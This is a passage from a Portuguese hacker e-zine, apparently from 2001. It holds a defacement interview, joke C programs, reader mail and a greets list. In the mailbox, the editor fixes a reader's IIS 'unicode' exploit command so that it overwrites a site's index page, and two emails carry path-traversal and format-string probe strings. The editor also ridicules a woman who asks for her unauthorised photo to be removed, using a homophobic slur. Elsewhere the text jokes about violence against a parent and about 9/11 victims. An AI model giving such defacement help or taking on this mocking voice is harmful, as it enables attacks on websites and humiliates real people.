Struck: Diversos. Cada membro tinha seus proprios motivos. O grupo deixava
        bem claro que nao se responsabilizava pelo ato de seus membros.

Struck: E quais eram os seus motivos??
Struck: Eu ia de gaiato. Ajudava os outros. Unica vez que fiz deface por
        motivos proprios, foi qdo o Cacaio tava com problemas com a
        policia. Ae eu e o encrypt fizemo um Mass Hack em mais de 100
        paginas com o protesto.

Struck: E vc ainda faz defaces??
Struck: Nao.

Struck: Pq??
Struck: Nunca vi graca em alterar paginas sem proposito nenhum. Se um
        dia eu precisar ser ouvido eu talvez volte a fazer defaces. Mas
        provavelmente isso nao aconteca pq agora se precisar falar alguma
        coisa, tenho a f3 para isso.

Struck: Depois que saiu da dk o que houve??
Struck: Foi +/- a epoca que comecei a beber feito um gamba.
        Talvez por isso nao lembre direito o que aconteceu nessa epoca.

Struck: Porra! Voce recebeu convites de outros grupos!
Struck: Ah eh!! Obrigado por lembrar. Embora eu nao tenha entrado em
        nenhum realmente.

Struck: Ja sao 4:30 da madrugada no horario de verao. Acho que podemos
        acabar com essa entrevista nao eh??
Struck: Achu q ninguem se importaria se isso acontece-se.

Struck: Sera que tem gente que leu essa reportagem ateh aki??
Struck: Provavelmente nao. Nem eu mesmo estou lendo o que escrevo pra
        nao ter desgosto.

Struck: Entao ta. Obrigado por seu tempo.
Struck: Meu tempo eh todo seu.

Struck: Realmente...
Struck: Se liga que amanha temos prova.

Struck: Eh mesmo. Vou dormir. Boa noite.
Struck: Falow!!










/*
 *  Pra encerrar, o profile do behael que estreiou na edicao passada e
 * ja se puchou na materia sobre sockets para esta.
 *  Atencao! Pessoas fracas, nao leiam este profile pois ele eh triste.
 */
- Nick: BEHAEL
- Sexo: Faz tempo q nao faco
- Tamanho do pe': 44
- Leite: parmalate
- Programa predileto: Programa do Jô
- Mouse: ps2 infravermelho sem bolinha
- Bebida: Suco de limão
- Banho: Todos os sabados
- O que faz qdo ta cagando? Forca para ele sair
- O q diz qdo toma um fora? Mando se fuder
- Qual foi a maior loucura q ja fez?
Foi bater e enforcar o meu pai quando ele deu um murro em minha cpu
quase o matei
eu amo meu computador... tenho q protegelo
o motivo foi.. eu estar na internet e ele com psicose de energia ae 
ele ficou nervoso quando eu jah estava desligando o pc... soh falta-va
ah msg Power Down quando ele bateu muito forte... meu driver de cd-rom
nao funfa mais... ae eu levantei dando um soco na barriga dele ae eu 
enforquei quase matando ae minha madastra me tirou e eu fiquei dando 
risada sem saber pq

        _xXXXP^''                    ``^YXXXx_
     _xXXXXP~   15 - Sup3r l33t pr0gz    ~YXXXXx_
  _xXXXXXX(                                )XXXXXXx_
xXXXXXXXXXXbxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxdXXXXXXXXXXx
YXXXXXXXXXXP^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^YXXXXXXXXXXP
  ~YXXXXXX(                                )XXXXXXP~
     ~YXXXXb_        Cheat Struck        _dXXXXP~
        ~YXXXbx..                    ..xdXXXP~

   Para essa edicao muito lokinho se inspirou e fez seus proprios super
hack eleet progies para serem publicados na f3. Entao vamos la...

   Pra comecar, um programa feito por nosso amigo kamikase shell.
   O que ele faz eh inverter o valor de 2 variaveis bit-a-bit. Repare
a tecnologia utilizada no programa:

<++> Superprogs/inverte.c
#include<stdio.h>

main(){
 int a, b, aux;
 printf("informe o valor de a: ");
 scanf("%d", &a);
 printf("informe o valor de b: ");
 scanf("%d", &b);
 for (aux=128; aux>=1; aux>>=1){
  if ((a&aux) ^ (b&aux)){
   if (a&aux) {
    a=~a;
    a|=aux;
    a=~a;
   }else a|=aux;
   if (b&aux){
    b=~b;
    b|=aux;
    b=~b;
   }else b|=aux;
  }
 }
 printf("Valor  de a: %d, valor de b: %d\n", a, b);
}
<-->


   Tambem foi feito um programa para testar a paciencia do usuario. Seu
autor foi meu futuro bixo na puc mild7. Confira...

<++> Superprogs/patience.c
/*
Test Your Patience
Este eh um programa mtu h4x0r... soh para elite.. compila ae.. :)
by mild7..
*/

#include <stdio.h>
#define BELL '\007'
#define VERSION '1.0'

void ring(long int a)
{
long int i;
for (i=0;i<=a;i++) printf("%c",BELL);
}
clearscr();
main ()
{
long int n;
void ring(n);

    printf ("\n*** Test Your Patience v%f\n",VERSION);
    printf ("*** by mild7 - 2001\n\n");
    printf (" Eu desejo testar minha paciencia!\n");
    printf (" Para isso, digitarei um numero bem alto,\n");
    printf (" para todos verem como sou paciente: ");
    scanf("%d",&n);
    printf ("\n\n Emitindo Beeps de Paciencia...\n");
    printf (" Voce vai ser capaz de aguentar {{ %d }} Beeps? :)",n);

    ring(n-1);

}
<-->

   Como se nao bastassem estes 2 programas da elite hacker brasileira,
ainda restou o mais fantastico de todos. Este programa foi feito pelo
meu sumido amigo thasmx e encontrei aki perdido na minha maquina.
   Na epoca que ele me passou nao notei o quao surpriendente eh este
programa. O que o cara fez foi simplesmente codear toda a matrix.
   Incrivel! Ele codeou o mundo em que vivemos em poucas linhas. Um
desafio que poucos hackers do mundo inteiro conseguiriam fazer.
   Impressione-se com o programa:

<++> Superprogs/matrix.c
#include <stdio.h>

int main()
{
       
      long int z;
      for (z=100000 ;z <=999999 ;z++) {printf ("  \e[1;33m%d  ",z);
      if (z==999999) z=100000;}
      return(0);
}     
          
<-->

   Por hoje eh soh!
   Enviem seus leet progs para meu email que se forem realmente 
elitos, serao publicados com os devidos creditos. 










        _xXXXP^''                    ``^YXXXx_
     _xXXXXP~        16 - Mailb0x        ~YXXXXx_
  _xXXXXXX(                                )XXXXXXx_
xXXXXXXXXXXbxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxdXXXXXXXXXXx
YXXXXXXXXXXP^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^YXXXXXXXXXXP
  ~YXXXXXX(                                )XXXXXXP~
     ~YXXXXb_        Cheat Struck        _dXXXXP~
        ~YXXXbx..                    ..xdXXXP~


From: ************@bol.com.br
Subject: Tirem já do ar!!!  
Date : Sat, 21 Jul 2001 01:28:27 -0300  

O site http://www.fatal3rror.com/cgi-bin/f3.cgi?showdefeace=POPEYE_KROLL
foi um mulek que eu odeio que criou em meu nome, fazendo essa sacanagem,
por favor tirem já do ar, ñ é permitido humilhar ninguém , e desse jeito
eu me sinto ofendido!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!

 
-----------------------------------------

   Huahuahuahauhauha!!!
   Eu comentei com os loko la q nao demoraria mt pra isso acontecer...


###################################
###################################
###################################

De: *****@ig.com.br
assunto: kra eu estou lendo sua zine


como vc mesmo disse aquela parte de buff e overflows e mesmo roia de aprender
mas eu acho que e melhor vc recomendar na proxima vez para pesso aprende a 
linguagem de C, pq se não o leitor nao vai entender nada pq tem que saber 
programar para poder entender oq ele tem de fazer e eu gostaria que vc me 
respondesse uma pergumta eu uso o linux mandrake e eu estava tentando usar o
exploit unicodexecute2.pl eu eu digitei o seguinte comando:

perl unicodexecute.pl 222.222.222.222:80''echo SITE HACKED BY HACKER GROUP!!
> c:inetpubwwwrootindex.htm''

depois do camando eu fui no site e nao adiantou porra nenhuma, e aparesseu um
arquivo no meu diretorio /home/duseu/c:inetpubwwwrootindex.htm

da pra vc me explicar oq ocorre, pq sempre da esse problema, se naum quiser 
usar o e-mail usa o icq ********, no irc da brasnet eu sou o ****** .


----------------

   Ok... eh q eu esperava dos leitores da F3 um conhecimento minimo em C para
entender a materia... mas ta valendo o comentario.. vou me ligar mais em 
avisar os pre-requesitos antes de comecar os txts.
   Qto ao seu problema no xploit do unicode eh tanto na utilizacao das aspas
qto no caminho do index.htm. Deveria ser algo tipo:

unicode.pl 222.222.222.222:80 "echo bla > c:\inet\pub\www\root\index.htm"

   Issu se o caminho para o index.htm for este mesmo... 


###################################
###################################
###################################


From : ********@terra.com.br
Subject : VCs ESTÃO DE PARABÉNS  
Date : Sat, 11 Aug 2001 22:19:38 -0300    

Parabéns pela página. Excelente, gostei muito, tudo bem simples e obvio, sem
"papagaiadas".

-------------------

   Valew! O credito eh todo do pcHazard... Eu apenas opino no que a page pode
ter e tal... Ah!!! o jpg la fui eu quem fiz tb... =)


###################################
###################################
###################################

From: **************@globo.com
Subject: Sobre o ke vc falow na f3-05...  
Date: Sun, 12 Aug 2001 21:24:45 -0300  

Ae, sei que vc e bem renomado entre a galera mais chegada de vcs, mais quero
dizer q a Bhoor Zine já era, issu mesmo, ja era...
Vc fez bem de detonar ela, pq o nivel tava ruim pra karalho, naum querendo
desfazer de vc mais a Cszine 00 ate a 05 era uma bosta :) Ae a Bhoor zine ERA
pra os iniciantes dos iniciantes...
Naum tenho nada contra vc, so quero amizade e talz...
Divulge na proxima f3 (06) q a Bhoor Zine acabou, ha, queria um dia levar um
papo com vc... Apareça nos fins de semana no irc.bransnet.org podemos tracar
ideias mais avançadas...
Vc e gente boa, continue assim q vc vai longe...
Valew por min alertar sobre a Bhoor Zine, TENHO Q RECONHECER Q ERA UMA MERDA!
falow!...


--------------

   Denada. =)
   Eu to quase toda a madrugada na brasnet, o nick eh struck.
   Sobre a cszine, ela era escrita com objetivo de aprendizado pessoal. 
Nao tive culpa de que fez sucesso... =)
   Ta feito o registro entao de q a bhoor acabou.
   

###################################
###################################
###################################

From: ******@zaz.com.br
Subject: !!!!  
Date: Mon, 27 Aug 2001 12:45:20 -0300 (EST)  

podi crê meu, vai fazendo as zines...que to achando legau...


--------------

   Podis crer!! =)


###################################
###################################
###################################

From: (******)
Subject: Elogios  
Date: Tue, 28 Aug 2001 22:07:00 -0300   

Manu´s véio´s, num tenhu muito o q falar pra vcs

Essa hp é fera.

--------------

   Tkz. Novamente digo q os meritos sao todos do pchazard.


###################################
###################################
###################################

From: ****@bol.com.br  
Subject: linux !!!!!! linux !!!!!! linux !!!!!! linux !!!!!! linux !!!!!  
Date: Sat, 18 Aug 2001 01:04:48 -0300  
   

E ae Struck Blz???

Cara to p...... da vida com o Mandrake 8.0, instalei ele, ta rodando todo
bunitinho, quando digite vi /etc/inetd.conf não existia, é uma porra, não tem
telnet, não tem nada !!!!! eu só instalei com um CD q veio na Revista do Linux.

Eu to pensando em instalar o Debian, será que rende??

Valeu!!!!1

----------------

   Nao sei sobre o Mandrake pois nunca usei ele.
   O debian costuma usar somente programas opensource, embora nao creio que
num CD de revista venham os source juntos. Os cara costumam fikar um bom tempo
corrigindo bugs nos programas para soh entao lancarem, o q nao adianta muito
por as falhas costumam chegar a publico soh depois de lancarem a versao
released. E isso tambem atrapalha na atualizacao dos pacotes.
   Fora isso, minha opiniao pessoal sobre o sistema de epacoteamento usado
pelo debian nao me agrada muito. Embora seja possivel baixar, despacotear e
instalar um pacote com um unico comando, nao gosto muito de usar dkpg e dselect
no lugar de tar e pkgtool.
   A instalacao do debian tambem nao eh tao amigavel qto a do redhat e openlinux
mas nao chega a complicar.


###################################
###################################
###################################

From: "../../../../../../../../../": (../../../../../../../../../:)  
Subject: ../../../../../../../../../:)  
Date: Tue, 7 Aug 2001 06:19:51 -0300  

../../-rw../%p../%s../-rw

----------------------

From: %p%P%P@%p%p%p%p (%p%p%p%p)
Subject: %p%p%p%p
Date: Tue, 7 Aug 2001 06:18:50 -0300

-r%p-r

----------------------
 
   Olha as crianca tentando brinca de hacker ae...
   Achu q alguns nao entenderam que era para tentar hackear o danos e
nao nossa page. Poupem tempo, pois nossos cgis nao sao furados como
uns por ae... =)


###################################
###################################
###################################

From: <************@bol.com.br>  
Date: Thu, 6 Sep 2001 10:38:15 -0300   

Cara acho d+++ essa tua zine muito boa mesmo olhei umas scritas em 
ingles e não tem nada a ver mas tua explica muito bem ve se continua
mandando ver e  traz umas novidades pra nós do udigrudi !!!
 
ve se coloca uma matéria nas proxima edições do (IIS) 4.0 5.0 


----------------------

   Tkz!
   Sobre o IIS, vamo ver c rola.


###################################
###################################
###################################

From: ******@uol.com.br
Subject: Quero uma explicacao  
Date: Sat, 8 Sep 2001 20:28:27 -0300  

Por favor.. recebi de um amigo meu, a indicacao de que minha foto estaria sendo
usada indevidamente e sem autorizacao no seguinte endereco
http://www.fatal3rror.com/cgi-bin/f3.cgi?showdefeace=Walucyg

constatei o fato ser verdadeiro.. ja copiei a tal pagina para meu desktyop e nao
gostei da brincadeira (se é que posso chamar assim, tao estupida e
preconceituosa pagina)..

peco que retirem esta foto do ar, pois nao dei autorizacao para esta
publicaCAO...  e muuito menos para esta zombaria toda... podem visitar meu site
e conferir como sou eu mesma....

meu site encontra-se em http://www.maite.com.br.ms

Peco que retirem minha foto desta pagina de mal gosto... e espero um retorno de
voces... do contrario terei que entrar em contato direto com  o provedor de
voces, que aceita este tipo de coisa ofensiva a pessoas de bem.

obrigada e espero poder contar com voces....

Atenciosamente
Maite Schneider

----------------------


   Huahauhauhauhauhauahuahuahauhauahuahha!
   Hauahuahuahauhauahuahauahuahuahauhauahauhauahuahauha!
   hauhauahuahuahauahauhauhauhaha.. hahahahahuahauhauhauahua!!!
   pera.. pera...
   hauhauhauhauahauhauahuha!!!!
   Nao acredito!!!
   Isso eh pra rir mesmo. Ate' as bicha chinelonas vem reclamar comigo.
   Nao se preocupe lindona... O nosso site ficou um tempao fora do ar e
poucos viram akilo.. +/- umas 200 pessoas por semana.
   Mas achu q se vc colocou suas fotos num site eh pq quer aparecer 
mesmo. Nos soh te demos uma ajuda. Talvez vc fike feliz em saber que
esta era a area mais acessada do site. =)
   Fale com o pchazard pq ele eh responsavel por akilo.


###################################
###################################
###################################

From: *************@hotmail.com
Subject: bonus  
Date: Sun, 16 Sep 2001 21:06:44 -0300  

æ kra, tudo blz?
 
Quero saber quando mais ou menos a próxima zine sai pois tenho umas senhas
de e-mails do bol atuais, para enviar como colaboração, se tiverem o interesse
é só falar...
 
Tamos æ !
 
[]'z 

----------------------

   Valew. Mas nao.
   Isso foge um pouco do objetivo da zine q eh ensinar e nao dar as coisas de
mao beijada para a galera. Em todo o caso valeu pelo interesse em ajudar a zine.










        _xXXXP^''                    ``^YXXXx_
     _xXXXXP~      17 - End of Zine      ~YXXXXx_
  _xXXXXXX(                                )XXXXXXx_
xXXXXXXXXXXbxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxdXXXXXXXXXXx
YXXXXXXXXXXP^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^YXXXXXXXXXXP
  ~YXXXXXX(                                )XXXXXXP~
     ~YXXXXb_        Cheat Struck        _dXXXXP~
        ~YXXXbx..                    ..xdXXXP~

   Aki acaba essa edicao da fatal3rror.

   Para nao ter mais problemas, todos os profiles publicados nesta
edicao foram publicados com a autorizacao dos individuos. Alguns
profiles feitos ja faz um tempo nao foram publicados pq nao consegui
contatar os respectivos profilados. =)

   Qquer reclamacoes sobre a zine ou sobre as materias publicadas na
mesma, falem com alguem que lhes de ouvidos pq eu nao to nem ae pra 
isso. Mas se quiserem enviar emails para mim com suas reclamacoes, vc
corre o risco de seu email aparecer aki publicado.
   No mais, espero q tenham gostado do nosso trabalho que embora 
gratuito espero que tenha sido de boa qualidade. Talvez melhor do que
muitos outros trabalhos lucrativos...
   Chega de falar merda. 

   Atencao! Atualizei a lista de nomes do greets. O pessoal ja tava
comecando a reclamar. Alias eles soh fazem isso. =)


^^VENTO^^         Foi levado pelo vento!
`pcmcia           Foi levado pelo homem do saco!
alex              Apoia movimento em prol a canhotos usarem mouse.
appletalk         Nao ganhou o que queria no dia das criancas.
Cacaio            Casou-se! Sobre pressao! Por ter engravidado uma mina.
Chernob           Viajou para a lua!
BEHAEL            Viajou para a maionese!
C0nd0r            Nao esta! Deixe seu recado na secretaria eletronica.
Carti             Preso! Suspeito de atentado terrorista.
chm0d             Viciado em desmontar coisas q nao sabe como montar.
Dave Mustaine     Morto! No atentado ao WTC.
dRo               Procurado! Possivel contato de bin laden no Brasil.
Encripty          Saiu! Nao disse qdo volta.
flash             Acha q controle remoto eh bruxaria.
hak               Comprou novo cd da sandy e jr. Diz q foi por engano.
Kamikase Shell    Morto! Piloto kamikase que derrubou o WTC.
MidNight          Ja volta! Saiu para uivar para a lua.
mild7             Meu futuro bixo na pucrs!! Esse inda vai sofrer!!!
mph               in Love! por Jessica Rabbit.
N4rfy             Internado! Viciado em fitas metricas.
NuLLz             Dono de um bar ao lado de um campo de desentoxicacao.
onlooker          Acredita q a maior invensao do homem foi o chinelo.
Overnix           Saiu pra comprar erva e nao voltou ainda.
ozzy              Nao compreende a tecnologia usada num isqueiro.
pcHazard          Manifestante contra o direito de caes usarem inet.
psaux             Preso por derrubar o site www.worldtradecenter.com.
Rastermition      Mata aula pra jogar peteca com os amigos.
RoadHouse         Internado no hospital! Ataque de pulgas.
Slash_DOMI        Em coma! Desobedeceu sua mae.
snape             Sequestrado! Fianca: R$5,00. Ainda nao paga.
Source            Estuprado por uma gangue de velhinhas.
Spike             Provalecido q rouba merendas no recreio.
syscall           Mija assobiando o hino nacional.
Thasmx            Expulso 6x do mesmo colegio.
Tinkertrain       Assassinado! Apos uma briga envolvendo cortadores de unha.
TPGA              Morto! Cherou antrax pensando ser heroina.
vh                Compositor de samba-rock.
ZaNnDoN           Fugiu de casa pq brigou com sua bisavo'.


   Beijo pras guria tb. Mesmo sabendo que elas nao estao lendo isso...

Doty              Roubou as revistas de colorir de sua priminha.
MaRyJaNe          Foi fumada no show do canamare'.
Tate              Especializou-se em listar coisas q odeia.
TheFaiRy          Acredita na fada do dente.


   Agradeco tb a zinesbr q ultimamente tem feito propaganda gratuita 
pra mim e para a f3. Ah! valew tb ao pessoal da revista pcMaster que
publicou minha page la (edicao 51, se nao me engano).

   Ultimas palavras:
   Retocando o assunto dos logs da semana passada... Ja estou de tregua
com todos os editores chefes das zines mencionadas, embora nao simpatize
com alguns. Nesta edicao publiquei mais um log meio polemico, mas isto
nao eh nada mais do que meu direito de resposta que eu mesmo me dei.
   Heheh... Parece que estou tentando acabar com a concorrencia neh??
Se nos ganhassemos alguma coisa, ae sim teriamos motivos para isso. Uma
zine tentando desbancar a outra. Mas como somos todos escritores 
nao-ambiciosos, nao temos motivos para isso.
   Assim como protestamos contra o governo, eu continuarei a protestar
aki, enquanto as coisas nao mudarem.

   Soh isso. Cya!








_EoF_
